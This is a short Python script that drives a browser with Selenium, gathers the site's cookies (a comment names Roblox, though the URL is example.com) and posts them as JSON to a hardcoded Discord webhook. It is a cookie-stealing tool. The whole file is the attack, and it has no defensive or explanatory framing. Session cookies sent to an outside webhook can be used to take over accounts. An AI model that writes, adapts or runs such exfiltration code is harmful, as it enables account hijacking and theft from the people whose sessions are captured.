import requests
import json
import selenium
from selenium import webdriver

# Set up the Discord webhook URL
discord_webhook_url = "https://discord.com/api/webhooks/1213822293600509992/q6NWgKGEaDzE0LgAtzi9bWk6PO8OavRB9oOfgCSzWAXeyfZYpqQNMU7PN7p0xW_lEdvw"

# Set up the web browser using Selenium
browser = webdriver.Chrome()

# Navigate to the website and log in if necessary
browser.get("https://www.example.com/")
# Add code here to log in if necessary

# Get the cookies from the Roblox website
cookies = browser.get_cookies()

# Format the cookies as a JSON object
cookie_json = json.dumps(cookies)

# Set up the request payload with the cookies
payload = {
    "content": "Here are cookies from the website:\n\n" + cookie_json
}

# Send the POST request to the Discord webhook
response = requests.post(discord_webhook_url, data=payload)

# Print the response status code
print(response.status_code)

# Close the browser
browser.close()
